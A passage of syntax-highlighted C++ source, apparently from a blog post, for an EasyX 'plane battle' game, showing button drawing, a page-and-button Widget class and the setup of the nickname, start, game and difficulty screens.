y &amp;&amp; mouseY &lt;= y + height)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">onClick</span>(); <span class="comment">// 执行按钮点击时的函数</span></span><br><span class="line">            isMouseOver = <span class="literal">false</span>;</span><br><span class="line">            scale = <span class="number">1.0f</span>;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 绘制按钮</span></span><br><span class="line">    <span class="function"><span class="type">void</span> <span class="title">draw</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="type">int</span> scaledWidth = width * scale; <span class="comment">// 缩放后的按钮宽度</span></span><br><span class="line">        <span class="type">int</span> scaledHeight = height * scale; <span class="comment">// 缩放后的按钮高度</span></span><br><span class="line">        <span class="type">int</span> scaledX = x + (width - scaledWidth) / <span class="number">2</span>; <span class="comment">// 缩放后的按钮x坐标</span></span><br><span class="line">        <span class="type">int</span> scaledY = y + (height - scaledHeight) / <span class="number">2</span>; <span class="comment">// 缩放后的按钮y坐标</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (isMouseOver)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">setlinecolor</span>(<span class="built_in">RGB</span>(<span class="number">0</span>, <span class="number">120</span>, <span class="number">215</span>)); <span class="comment">// 鼠标悬停时按钮边框颜色</span></span><br><span class="line">            <span class="built_in">setfillcolor</span>(<span class="built_in">RGB</span>(<span class="number">229</span>, <span class="number">241</span>, <span class="number">251</span>)); <span class="comment">// 鼠标悬停时按钮填充颜色</span></span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">setlinecolor</span>(<span class="built_in">RGB</span>(<span class="number">255</span>, <span class="number">144</span>, <span class="number">126</span>)); <span class="comment">// 按钮边框颜色</span></span><br><span class="line">            <span class="built_in">setfillcolor</span>(<span class="built_in">RGB</span>(<span class="number">225</span>, <span class="number">225</span>, <span class="number">225</span>)); <span class="comment">// 按钮填充颜色</span></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="built_in">setlinestyle</span>(PS_DASH | PS_ENDCAP_FLAT, <span class="number">3</span>);  <span class="comment">// 设置线条宽度和样式</span></span><br><span class="line">        <span class="built_in">fillroundrect</span>(scaledX, scaledY, scaledX + scaledWidth, scaledY + scaledHeight, <span class="number">50</span>, <span class="number">50</span>); <span class="comment">// 绘制按钮</span></span><br><span class="line">        <span class="built_in">settextcolor</span>(GREEN); <span class="comment">// 设置文本颜色为绿色</span></span><br><span class="line">        <span class="built_in">setbkmode</span>(TRANSPARENT); <span class="comment">// 设置文本背景透明</span></span><br><span class="line">        <span class="built_in">settextstyle</span>(<span class="number">25</span> * scale, <span class="number">0</span>, _T(<span class="string">&quot;华文彩云&quot;</span>)); <span class="comment">// 设置文本大小和字体</span></span><br><span class="line">        <span class="comment">//居中显示按钮文本</span></span><br><span class="line">        <span class="type">int</span> textX = scaledX + (scaledWidth - <span class="built_in">textwidth</span>(text.<span class="built_in">c_str</span>())) / <span class="number">2</span>; <span class="comment">// 计算文本在按钮中央的x坐标</span></span><br><span class="line">        <span class="type">int</span> textY = scaledY + (scaledHeight - <span class="built_in">textheight</span>(_T(<span class="string">&quot;幼圆&quot;</span>))) / <span class="number">2</span>; <span class="comment">// 计算文本在按钮中央的y坐标</span></span><br><span class="line">        <span class="built_in">outtextxy</span>(textX, textY, text.<span class="built_in">c_str</span>()); <span class="comment">// 在按钮上绘制文本</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 定义Widget类，表示一个简单的图形用户界面</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Widget</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">    wstring text_name = <span class="string">L&quot;飞机大战&quot;</span>; <span class="comment">// 标题文本</span></span><br><span class="line">    wstring set_name = <span class="string">L&quot;游戏设置&quot;</span>; <span class="comment">// 标题文本</span></span><br><span class="line">    wstring difficulty_name = <span class="string">L&quot;游戏难度&quot;</span>; <span class="comment">// 难度文本</span></span><br><span class="line">    wstring stop_name = <span class="string">L&quot;游戏暂停&quot;</span>; <span class="comment">// 暂停文本</span></span><br><span class="line">    wstring fail_name = <span class="string">L&quot;游戏失败&quot;</span>; <span class="comment">// 失败文本</span></span><br><span class="line">    wstring success_name = <span class="string">L&quot;闯关成功&quot;</span>; <span class="comment">// 失败文本</span></span><br><span class="line">    wstring rank_name = <span class="string">L&quot;排行榜&quot;</span>; <span class="comment">// 排行榜文本</span></span><br><span class="line">    wstring easy_name = <span class="string">L&quot;简单模式排行榜&quot;</span>; <span class="comment">// 简单排行榜文本</span></span><br><span class="line">    wstring medium_name = <span class="string">L&quot;中等模式排行榜&quot;</span>; <span class="comment">// 中等排行榜文本</span></span><br><span class="line">    wstring hard_name = <span class="string">L&quot;地狱模式排行榜&quot;</span>; <span class="comment">// 地狱排行榜文本</span></span><br><span class="line">    wstring author_name = <span class="string">L&quot;制作组信息&quot;</span>; <span class="comment">// 制作组文本</span></span><br><span class="line">    wstring rule_name = <span class="string">L&quot;游戏玩法&quot;</span>; <span class="comment">// 游戏玩法文本</span></span><br><span class="line">    RECT rect_name = &#123; <span class="number">320</span>, <span class="number">50</span>, <span class="number">480</span>, <span class="number">150</span> &#125;;</span><br><span class="line">    <span class="type">int</span> text_x; <span class="comment">// 文字的x坐标</span></span><br><span class="line">    <span class="type">int</span> text_y; <span class="comment">// 文字的y坐标</span></span><br><span class="line">    <span class="type">int</span> width; <span class="comment">// 宽度</span></span><br><span class="line">    <span class="type">int</span> height; <span class="comment">// 高度</span></span><br><span class="line">    <span class="type">int</span> currentIndex; <span class="comment">// 当前页面索引</span></span><br><span class="line">    vector&lt;IMAGE *&gt; pages; <span class="comment">// 存储所有页面的图片指针</span></span><br><span class="line">    vector&lt;vector&lt;Button *&gt;&gt; buttons; <span class="comment">// 存储每个页面上的按钮</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 添加一个页面</span></span><br><span class="line">    <span class="function"><span class="type">void</span> <span class="title">addPage</span><span class="params">(IMAGE *page)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        pages.<span class="built_in">push_back</span>(page);</span><br><span class="line">        buttons.<span class="built_in">push_back</span>(&#123;&#125;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 在指定页面上添加一个按钮</span></span><br><span class="line">    <span class="function"><span class="type">void</span> <span class="title">addButton</span><span class="params">(<span class="type">int</span> index, Button *button)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (index &gt;= <span class="number">0</span> &amp;&amp; index &lt; buttons.<span class="built_in">size</span>())</span><br><span class="line">        &#123;</span><br><span class="line">            buttons[index].<span class="built_in">push_back</span>(button);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 设置当前显示的页面索引</span></span><br><span class="line">    <span class="function"><span class="type">void</span> <span class="title">setCurrentIndex</span><span class="params">(<span class="type">int</span> index)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (index &gt;= <span class="number">0</span> &amp;&amp; index &lt; pages.<span class="built_in">size</span>())</span><br><span class="line">        &#123;</span><br><span class="line">            currentIndex = index;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 处理鼠标点击事件</span></span><br><span class="line">    <span class="function"><span class="type">void</span> <span class="title">mouseClick</span><span class="params">(<span class="type">int</span> mouseX, <span class="type">int</span> mouseY)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (currentIndex &gt;= <span class="number">0</span> &amp;&amp; currentIndex &lt; buttons.<span class="built_in">size</span>())</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">for</span> (Button *button : buttons[currentIndex])</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">if</span> (button-&gt;<span class="built_in">checkClick</span>(mouseX, mouseY))</span><br><span class="line">                &#123;</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 处理鼠标移动事件</span></span><br><span class="line">    <span class="function"><span class="type">void</span> <span class="title">mouseMove</span><span class="params">(<span class="type">int</span> mouseX, <span class="type">int</span> mouseY)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (currentIndex &gt;= <span class="number">0</span> &amp;&amp; currentIndex &lt; buttons.<span class="built_in">size</span>())</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">for</span> (Button *button : buttons[currentIndex])</span><br><span class="line">            &#123;</span><br><span class="line">                button-&gt;<span class="built_in">checkMouseOver</span>(mouseX, mouseY);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 绘制当前页面的内容</span></span><br><span class="line">    <span class="function"><span class="type">void</span> <span class="title">draw</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (currentIndex &gt;= <span class="number">0</span> &amp;&amp; currentIndex &lt; pages.<span class="built_in">size</span>())</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">putimage</span>(<span class="number">0</span>, <span class="number">0</span>, pages[currentIndex]); <span class="comment">// 在窗口中绘制当前页面的图片</span></span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (currentIndex &gt;= <span class="number">0</span> &amp;&amp; currentIndex &lt; buttons.<span class="built_in">size</span>())</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">for</span> (Button *button : buttons[currentIndex])</span><br><span class="line">                &#123;</span><br><span class="line">                    button-&gt;<span class="built_in">draw</span>(); <span class="comment">// 绘制当前页面上的所有按钮</span></span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="built_in">Widget</span>(<span class="type">int</span> width, <span class="type">int</span> height)</span><br><span class="line">        :<span class="built_in">width</span>(width), <span class="built_in">height</span>(height), <span class="built_in">currentIndex</span>(<span class="number">-1</span>)</span><br><span class="line">    &#123;</span><br><span class="line">    &#125;</span><br><span class="line">    ~<span class="built_in">Widget</span>() &#123;&#125;</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="type">void</span> <span class="title">drawpage</span><span class="params">(wstring loc, wstring name)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        IMAGE *page = <span class="keyword">new</span> <span class="built_in">IMAGE</span>(width, height);<span class="comment">// 昵称界面的图片指针</span></span><br><span class="line">        <span class="built_in">loadimage</span>(page, loc.<span class="built_in">c_str</span>(), width, height, <span class="literal">true</span>);</span><br><span class="line">        <span class="built_in">putimage</span>(<span class="number">0</span>, <span class="number">0</span>, page);</span><br><span class="line">        <span class="built_in">setlinestyle</span>(PS_DASH | PS_ENDCAP_FLAT, <span class="number">3</span>);  <span class="comment">// 设置线条宽度和样式</span></span><br><span class="line">        <span class="comment">// 绘制标题</span></span><br><span class="line">        <span class="built_in">fillroundrect</span>(rect_name.left, rect_name.top, rect_name.right, rect_name.bottom, <span class="number">50</span>, <span class="number">50</span>); <span class="comment">// 绘制标题</span></span><br><span class="line">        <span class="built_in">settextcolor</span>(GREEN); <span class="comment">// 设置文本颜色为绿色</span></span><br><span class="line">        <span class="built_in">setbkmode</span>(TRANSPARENT); <span class="comment">// 设置文本背景透明</span></span><br><span class="line">        <span class="built_in">settextstyle</span>(<span class="number">35</span>, <span class="number">0</span>, _T(<span class="string">&quot;华文琥珀&quot;</span>)); <span class="comment">// 设置文本大小和字体</span></span><br><span class="line">        text_x = rect_name.left + (rect_name.right - rect_name.left - <span class="built_in">textwidth</span>(name.<span class="built_in">c_str</span>())) / <span class="number">2</span>;</span><br><span class="line">        text_y = rect_name.top + (rect_name.bottom - rect_name.top - <span class="built_in">textheight</span>(name.<span class="built_in">c_str</span>())) / <span class="number">2</span>;</span><br><span class="line">        <span class="built_in">outtextxy</span>(text_x, text_y, name.<span class="built_in">c_str</span>()); <span class="comment">// 在按钮上绘制文本</span></span><br><span class="line">        <span class="built_in">getimage</span>(page, <span class="number">0</span>, <span class="number">0</span>, width, height); <span class="comment">// 将昵称页面的内容保存到图片中</span></span><br><span class="line">        <span class="built_in">addPage</span>(page); <span class="comment">// 添加昵称页面</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="type">void</span> <span class="title">drawpage</span><span class="params">(wstring loc, wstring name, <span class="type">int</span>)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        IMAGE *page = <span class="keyword">new</span> <span class="built_in">IMAGE</span>(width, height);</span><br><span class="line">        <span class="built_in">loadimage</span>(page, loc.<span class="built_in">c_str</span>(), width, height, <span class="literal">true</span>);</span><br><span class="line">        <span class="built_in">putimage</span>(<span class="number">0</span>, <span class="number">0</span>, page);</span><br><span class="line">        <span class="comment">// 绘制简单榜标题</span></span><br><span class="line">        RECT rect = &#123; <span class="number">220</span>, <span class="number">50</span>, <span class="number">580</span>, <span class="number">150</span> &#125;;</span><br><span class="line">        <span class="built_in">fillroundrect</span>(rect.left, rect.top, rect.right, rect.bottom, <span class="number">50</span>, <span class="number">50</span>); <span class="comment">// 绘制标题</span></span><br><span class="line">        <span class="built_in">settextcolor</span>(GREEN); <span class="comment">// 设置文本颜色为绿色</span></span><br><span class="line">        <span class="built_in">setbkmode</span>(TRANSPARENT); <span class="comment">// 设置文本背景透明</span></span><br><span class="line">        <span class="built_in">settextstyle</span>(<span class="number">35</span>, <span class="number">0</span>, _T(<span class="string">&quot;华文琥珀&quot;</span>)); <span class="comment">// 设置文本大小和字体</span></span><br><span class="line">        text_x = rect.left + (rect.right - rect.left - <span class="built_in">textwidth</span>(name.<span class="built_in">c_str</span>())) / <span class="number">2</span>;</span><br><span class="line">        text_y = rect.top + (rect.bottom - rect.top - <span class="built_in">textheight</span>(name.<span class="built_in">c_str</span>())) / <span class="number">2</span>;</span><br><span class="line">        <span class="built_in">outtextxy</span>(text_x, text_y, name.<span class="built_in">c_str</span>()); <span class="comment">// 在按钮上绘制文本</span></span><br><span class="line">        <span class="built_in">fillroundrect</span>(rect.left - <span class="number">100</span>, rect.top + <span class="number">120</span>, rect.right + <span class="number">100</span>, rect.bottom + <span class="number">370</span>, <span class="number">50</span>, <span class="number">50</span>); <span class="comment">// 绘制标题</span></span><br><span class="line">        <span class="built_in">settextstyle</span>(<span class="number">25</span>, <span class="number">0</span>, _T(<span class="string">&quot;华文琥珀&quot;</span>)); <span class="comment">// 设置文本大小和字体</span></span><br><span class="line">        <span class="built_in">outtextxy</span>(rect.left - <span class="number">60</span>, rect.top + <span class="number">130</span>, <span class="string">L&quot;排名&quot;</span>); <span class="comment">// 绘制排名</span></span><br><span class="line">        <span class="built_in">outtextxy</span>(rect.left + <span class="number">140</span>, rect.top + <span class="number">130</span>, <span class="string">L&quot;昵称&quot;</span>); <span class="comment">// 绘制昵称</span></span><br><span class="line">        <span class="built_in">outtextxy</span>(rect.left + <span class="number">330</span>, rect.top + <span class="number">130</span>, <span class="string">L&quot;积分&quot;</span>); <span class="comment">// 绘制积分</span></span><br><span class="line">        <span class="built_in">getimage</span>(page, <span class="number">0</span>, <span class="number">0</span>, width, height); <span class="comment">// 将页面的内容保存到图片中</span></span><br><span class="line">        <span class="built_in">addPage</span>(page); <span class="comment">// 添加暂停页面</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 初始化控件，创建图形环境，设置页面和按钮</span></span><br><span class="line">    <span class="function"><span class="type">void</span> <span class="title">init</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="built_in">initgraph</span>(width, height);</span><br><span class="line">        <span class="built_in">BeginBatchDraw</span>(); <span class="comment">// 开始批量绘制, 批量绘制应该放在initgraph之后</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">// 0. 创建昵称界面</span></span><br><span class="line">        <span class="built_in">drawpage</span>(<span class="string">L&quot;./resource/page/name.jpg&quot;</span>, text_name);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 在昵称页面创建按钮input</span></span><br><span class="line">        Button *name_input = <span class="keyword">new</span> <span class="built_in">Button</span>(<span class="number">320</span>, <span class="number">200</span>, <span class="number">160</span>, <span class="number">60</span>, <span class="string">L&quot;输入游戏昵称&quot;</span>, [&amp;]() &#123;</span><br><span class="line">            <span class="built_in">InputBox</span>(name, <span class="number">20</span>, <span class="string">L&quot;请输入游戏昵称&quot;</span>); <span class="comment">// 点击按钮输入游戏昵称</span></span><br><span class="line">            &#125;);</span><br><span class="line">        <span class="built_in">addButton</span>(<span class="number">0</span>, name_input); <span class="comment">// 将按钮input添加到昵称页面</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">// 在昵称页面创建按钮进入游戏</span></span><br><span class="line">        Button *name_enter = <span class="keyword">new</span> <span class="built_in">Button</span>(<span class="number">320</span>, <span class="number">310</span>, <span class="number">160</span>, <span class="number">60</span>, <span class="string">L&quot;进入游戏&quot;</span>, [&amp;]() &#123;</span><br><span class="line">            <span class="built_in">setCurrentIndex</span>(<span class="number">1</span>);</span><br><span class="line">            &#125;);</span><br><span class="line">        <span class="built_in">addButton</span>(<span class="number">0</span>, name_enter); <span class="comment">// 将按钮添加到昵称页面</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">// 在昵称页面创建按钮退出游戏</span></span><br><span class="line">        Button *name_exit = <span class="keyword">new</span> <span class="built_in">Button</span>(<span class="number">320</span>, <span class="number">420</span>, <span class="number">160</span>, <span class="number">60</span>, <span class="string">L&quot;退出游戏&quot;</span>, [&amp;]() &#123;</span><br><span class="line">            <span class="built_in">closegraph</span>();</span><br><span class="line">            <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">            &#125;);</span><br><span class="line">        <span class="built_in">addButton</span>(<span class="number">0</span>, name_exit); <span class="comment">// 将按钮添加到昵称页面</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">// 1. 创建开始页面</span></span><br><span class="line">        <span class="built_in">drawpage</span>(<span class="string">L&quot;./resource/page/start.jpg&quot;</span>, text_name);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 在开始页面创建开始游戏按钮</span></span><br><span class="line">        Button *start_begin = <span class="keyword">new</span> <span class="built_in">Button</span>(<span class="number">320</span>, <span class="number">180</span>, <span class="number">150</span>, <span class="number">60</span>, <span class="string">L&quot;开始游戏&quot;</span>, [&amp;]() &#123;</span><br><span class="line">            <span class="built_in">setCurrentIndex</span>(<span class="number">2</span>); <span class="comment">// 进入游戏界面</span></span><br><span class="line">            &#125;);</span><br><span class="line">        <span class="built_in">addButton</span>(<span class="number">1</span>, start_begin); <span class="comment">// 将按钮添加到页面</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">// 在开始页面创建游戏难度按钮</span></span><br><span class="line">        Button *start_difficulty = <span class="keyword">new</span> <span class="built_in">Button</span>(<span class="number">320</span>, <span class="number">260</span>, <span class="number">150</span>, <span class="number">60</span>, <span class="string">L&quot;游戏难度&quot;</span>, [&amp;]() &#123;</span><br><span class="line">            <span class="built_in">setCurrentIndex</span>(<span class="number">3</span>); <span class="comment">// 进入游戏难度界面</span></span><br><span class="line">            &#125;);</span><br><span class="line">        <span class="built_in">addButton</span>(<span class="number">1</span>, start_difficulty); <span class="comment">// 将按钮添加到页面</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">// 在开始页面创建排行榜按钮</span></span><br><span class="line">        Button *start_rank = <span class="keyword">new</span> <span class="built_in">Button</span>(<span class="number">320</span>, <span class="number">340</span>, <span class="number">150</span>, <span class="number">60</span>, <span class="string">L&quot;排行榜&quot;</span>, [&amp;]() &#123;</span><br><span class="line">            <span class="built_in">setCurrentIndex</span>(<span class="number">4</span>); <span class="comment">// 进入排行榜界面</span></span><br><span class="line">            &#125;);</span><br><span class="line">        <span class="built_in">addButton</span>(<span class="number">1</span>, start_rank); <span class="comment">// 将按钮添加到页面</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">// 在开始页面创建游戏设置按钮</span></span><br><span class="line">        Button *start_set = <span class="keyword">new</span> <span class="built_in">Button</span>(<span class="number">320</span>, <span class="number">420</span>, <span class="number">150</span>, <span class="number">60</span>, <span class="string">L&quot;游戏设置&quot;</span>, [&amp;]() &#123;</span><br><span class="line">            <span class="built_in">setCurrentIndex</span>(<span class="number">5</span>); <span class="comment">// 进入开始界面的游戏设置界面</span></span><br><span class="line">            &#125;);</span><br><span class="line">        <span class="built_in">addButton</span>(<span class="number">1</span>, start_set); <span class="comment">// 将按钮添加到页面</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">// 在开始页面创建退出账号按钮</span></span><br><span class="line">        Button *start_exit = <span class="keyword">new</span> <span class="built_in">Button</span>(<span class="number">320</span>, <span class="number">500</span>, <span class="number">150</span>, <span class="number">60</span>, <span class="string">L&quot;退出账号&quot;</span>, [&amp;]() &#123;</span><br><span class="line">            <span class="built_in">setCurrentIndex</span>(<span class="number">0</span>); <span class="comment">// 返回昵称界面</span></span><br><span class="line">            &#125;);</span><br><span class="line">        <span class="built_in">addButton</span>(<span class="number">1</span>, start_exit); <span class="comment">// 将按钮添加到页面</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">// 2. 创建游戏页面</span></span><br><span class="line">        IMAGE *page_game = <span class="keyword">new</span> <span class="built_in">IMAGE</span>(width, height);</span><br><span class="line">        <span class="built_in">loadimage</span>(page_game, <span class="string">L&quot;./resource/page/game.jpg&quot;</span>, width + <span class="number">400</span>, height, <span class="literal">true</span>);</span><br><span class="line">        <span class="built_in">putimage</span>(<span class="number">0</span>, <span class="number">0</span>, page_game);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 演示</span></span><br><span class="line">        <span class="comment">// 加载图片：以CPP文件为起始位置</span></span><br><span class="line">        <span class="built_in">loadimage</span>(page_game, <span class="string">L&quot;./resource/icon/plane.png&quot;</span>, <span class="number">50</span>, <span class="number">50</span>, <span class="literal">true</span>);<span class="comment">// 战机</span></span><br><span class="line">        <span class="built_in">drawAlpha</span>(page_game, <span class="number">400</span>, <span class="number">580</span>);     <span class="comment">// 载入PNG图并去透明部分</span></span><br><span class="line">        <span class="built_in">loadimage</span>(page_game, <span class="string">L&quot;./resource/icon/plane_bullet.png&quot;</span>, <span class="number">30</span>, <span class="number">30</span>, <span class="literal">true</span>);<span class="comment">// 战机子弹</span></span><br><span class="line">        <span class="built_in">drawAlpha</span>(page_game, <span class="number">410</span>, <span class="number">540</span>);     <span class="comment">// 载入PNG图并去透明部分</span></span><br><span class="line">        <span class="built_in">loadimage</span>(page_game, <span class="string">L&quot;./resource/icon/enemy.png&quot;</span>, <span class="number">40</span>, <span class="number">40</span>, <span class="literal">true</span>);<span class="comment">// 敌机1</span></span><br><span class="line">        <span class="built_in">drawAlpha</span>(page_game, <span class="number">400</span>, <span class="number">50</span>);     <span class="comment">// 载入PNG图并去透明部分</span></span><br><span class="line">        <span class="built_in">loadimage</span>(page_game, <span class="string">L&quot;./resource/icon/enemy_bullet.png&quot;</span>, <span class="number">30</span>, <span class="number">30</span>, <span class="literal">true</span>);<span class="comment">// 敌机子弹1</span></span><br><span class="line">        <span class="built_in">drawAlpha</span>(page_game, <span class="number">405</span>, <span class="number">100</span>);     <span class="comment">// 载入PNG图并去透明部分</span></span><br><span class="line">        <span class="built_in">loadimage</span>(page_game, <span class="string">L&quot;./resource/icon/enemy.png&quot;</span>, <span class="number">40</span>, <span class="number">40</span>, <span class="literal">true</span>);<span class="comment">// 敌机2</span></span><br><span class="line">        <span class="built_in">drawAlpha</span>(page_game, <span class="number">350</span>, <span class="number">150</span>);     <span class="comment">// 载入PNG图并去透明部分</span></span><br><span class="line">        <span class="built_in">loadimage</span>(page_game, <span class="string">L&quot;./resource/icon/enemy_bullet.png&quot;</span>, <span class="number">30</span>, <span class="number">30</span>, <span class="literal">true</span>);<span class="comment">// 敌机子弹2</span></span><br><span class="line">        <span class="built_in">drawAlpha</span>(page_game, <span class="number">355</span>, <span class="number">200</span>);     <span class="comment">// 载入PNG图并去透明部分</span></span><br><span class="line">        <span class="built_in">loadimage</span>(page_game, <span class="string">L&quot;./resource/icon/enemy.png&quot;</span>, <span class="number">40</span>, <span class="number">40</span>, <span class="literal">true</span>);<span class="comment">// 敌机3</span></span><br><span class="line">        <span class="built_in">drawAlpha</span>(page_game, <span class="number">450</span>, <span class="number">70</span>);     <span class="comment">// 载入PNG图并去透明部分</span></span><br><span class="line">        <span class="built_in">loadimage</span>(page_game, <span class="string">L&quot;./resource/icon/enemy_bullet.png&quot;</span>, <span class="number">30</span>, <span class="number">30</span>, <span class="literal">true</span>);<span class="comment">// 敌机子弹3</span></span><br><span class="line">        <span class="built_in">drawAlpha</span>(page_game, <span class="number">455</span>, <span class="number">120</span>);     <span class="comment">// 载入PNG图并去透明部分</span></span><br><span class="line">        <span class="built_in">loadimage</span>(page_game, <span class="string">L&quot;./resource/icon/enemy.png&quot;</span>, <span class="number">40</span>, <span class="number">40</span>, <span class="literal">true</span>);<span class="comment">// 敌机4</span></span><br><span class="line">        <span class="built_in">drawAlpha</span>(page_game, <span class="number">200</span>, <span class="number">30</span>);     <span class="comment">// 载入PNG图并去透明部分</span></span><br><span class="line">        <span class="built_in">loadimage</span>(page_game, <span class="string">L&quot;./resource/icon/enemy_bullet.png&quot;</span>, <span class="number">30</span>, <span class="number">30</span>, <span class="literal">true</span>);<span class="comment">// 敌机子弹4</span></span><br><span class="line">        <span class="built_in">drawAlpha</span>(page_game, <span class="number">205</span>, <span class="number">80</span>);     <span class="comment">// 载入PNG图并去透明部分</span></span><br><span class="line">        <span class="built_in">loadimage</span>(page_game, <span class="string">L&quot;./resource/icon/item.png&quot;</span>, <span class="number">40</span>, <span class="number">40</span>, <span class="literal">true</span>);<span class="comment">// 道具</span></span><br><span class="line">        <span class="built_in">drawAlpha</span>(page_game, <span class="number">200</span>, <span class="number">320</span>);     <span class="comment">// 载入PNG图并去透明部分</span></span><br><span class="line">        <span class="built_in">loadimage</span>(page_game, <span class="string">L&quot;./resource/icon/item.png&quot;</span>, <span class="number">40</span>, <span class="number">40</span>, <span class="literal">true</span>);<span class="comment">// 道具</span></span><br><span class="line">        <span class="built_in">drawAlpha</span>(page_game, <span class="number">600</span>, <span class="number">220</span>);     <span class="comment">// 载入PNG图并去透明部分</span></span><br><span class="line">        <span class="built_in">loadimage</span>(page_game, <span class="string">L&quot;./resource/icon/score.png&quot;</span>, <span class="number">40</span>, <span class="number">60</span>, <span class="literal">true</span>);<span class="comment">// 计分板</span></span><br><span class="line">        <span class="built_in">drawAlpha</span>(page_game, <span class="number">15</span>, <span class="number">15</span>);     <span class="comment">// 载入PNG图并去透明部分</span></span><br><span class="line">        <span class="built_in">loadimage</span>(page_game, <span class="string">L&quot;./resource/icon/life.png&quot;</span>, <span class="number">40</span>, <span class="number">40</span>, <span class="literal">true</span>);<span class="comment">// 血量</span></span><br><span class="line">        <span class="built_in">drawAlpha</span>(page_game, <span class="number">10</span>, <span class="number">590</span>);     <span class="comment">// 载入PNG图并去透明部分</span></span><br><span class="line">        <span class="built_in">fillroundrect</span>(<span class="number">60</span>, <span class="number">25</span>, <span class="number">130</span>, <span class="number">65</span>, <span class="number">20</span>, <span class="number">50</span>); <span class="comment">// 分数显示</span></span><br><span class="line">        <span class="built_in">fillroundrect</span>(<span class="number">50</span>, <span class="number">590</span>, <span class="number">120</span>, <span class="number">630</span>, <span class="number">20</span>, <span class="number">50</span>); <span class="comment">// 血量显示</span></span><br><span class="line">        <span class="built_in">getimage</span>(page_game, <span class="number">0</span>, <span class="number">0</span>, width, height); <span class="comment">// 将页面的内容保存到图片中</span></span><br><span class="line">        <span class="built_in">addPage</span>(page_game); <span class="comment">// 添加游戏页面</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">// 在游戏页面创建暂停按钮</span></span><br><span class="line">        Button *game_stop = <span class="keyword">new</span> <span class="built_in">Button</span>(<span class="number">730</span>, <span class="number">25</span>, <span class="number">60</span>, <span class="number">50</span>, <span class="string">L&quot;暂停&quot;</span>, [&amp;]() &#123;</span><br><span class="line">            <span class="built_in">setCurrentIndex</span>(<span class="number">6</span>); <span class="comment">// 进入暂停界面</span></span><br><span class="line">            &#125;);</span><br><span class="line">        <span class="built_in">addButton</span>(<span class="number">2</span>, game_stop); <span class="comment">// 将按钮添加到页面</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">// 3. 创建游戏难度页面</span></span><br><span class="line">        <span class="built_in">drawpage</span>(<span class="string">L&quot;./resource/page/difficulty.jpg&quot;</span>, difficulty_name);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 在游戏难度页面创建简单按钮</span></span><br><span class="line">        Button *difficulty_easy = <span class="keyword">new</span> <span class="built_in">Button</span>(<span class="number">320</span>, <span class="number">200</span>, <span class="number">160</span>, <span class="number">60</span>, <span 